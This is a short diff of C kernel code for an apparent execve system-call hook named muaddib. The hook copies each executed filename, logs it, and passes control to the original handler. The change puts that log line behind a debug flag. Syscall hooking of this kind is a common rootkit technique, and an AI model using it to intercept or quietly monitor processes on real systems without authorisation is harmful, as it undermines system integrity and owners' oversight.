@@ -8,7 +8,9 @@ asmlinkage int muaddib_execve(const struct pt_regs *regs){
     char filename_in_kernel[MAX_FILENAME_SIZE] = {0};
     int leng = strnlen_user(filename, MAX_FILENAME_SIZE);
     long copy = strncpy_from_user(filename_in_kernel, filename, leng);
+    #if DEBUGMSG == 1
     printk(KERN_INFO "muaddib: filename: %s", filename_in_kernel);
+    #endif
     return og_execve(regs);
 }
 #endif
